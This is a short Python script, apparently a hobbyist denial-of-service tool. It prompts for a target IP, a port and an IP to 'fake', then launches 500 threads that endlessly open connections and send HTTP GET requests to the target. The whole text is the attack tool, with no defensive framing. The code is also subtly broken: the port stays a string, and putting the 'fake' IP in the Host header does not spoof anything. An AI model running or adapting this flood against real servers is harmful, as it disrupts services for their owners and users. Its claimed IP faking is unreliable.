import socket
import threading

target = input("Enter the target IP: ")

port = input("Enter the port you want to target: ")

fake_ip = input("Enter the IP that you need to fake: ")

def attack():
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target, port))
		s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
		s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
		s.close()
for i in range(500):
	thread = threading.Thread(target=attack)
	thread.start()


